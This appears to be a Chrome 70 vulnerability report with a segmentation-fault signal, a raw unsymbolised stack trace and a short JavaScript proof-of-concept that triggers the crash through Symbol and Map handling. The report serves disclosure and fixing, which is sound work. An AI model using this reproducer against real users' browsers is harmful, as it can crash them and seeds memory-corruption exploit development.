<b>-------------------------</b>

<b>VULNERABILITY DETAILS</b>
Received signal 11 SEGV_ACCERR 000052f83330



==== C stack trace ===============================



 [0x00005673d81c]

 [0x0000595d4638]

 [0x0000f777bbd0]

 [0x00005803193f]

 [0x000056d5f6be]

 [0x00005819a976]

 [0x000058fbe715]

 [0x000058fbd8ff]

 [0x000058f88df0]

 [0x000070afa938]

 [0x000058f8a621]

 [0x0000f518209c]

 [0x0000578c11f9]

 [0x0000578c0246]

 [0x000056887bee]

 [0x0000567de4d3]

 [0x00005680c30a]

 [0x00005681567e]

 [0x00005681c9cc]

 [0x00005681e684]

 [0x0000f7246637]

[end of stack trace]


<b>VERSION</b>
Chrome Version: [70.0.3538.110] + [stable]
<b>Operating System: [Please indicate OS, version, and service pack level]</b>

<b>REPRODUCTION CASE</b>
poc.js:
try { var arrayid0 = Object.getOwnPropertySymbols( Math.constructor.__proto__ ); } catch (e) { }
try { var numberid1 = new Number([]); } catch (e) { }
try { const mapid1 = new Map([ [arrayid0[numberid1].description, 6] ]); } catch (e) { }

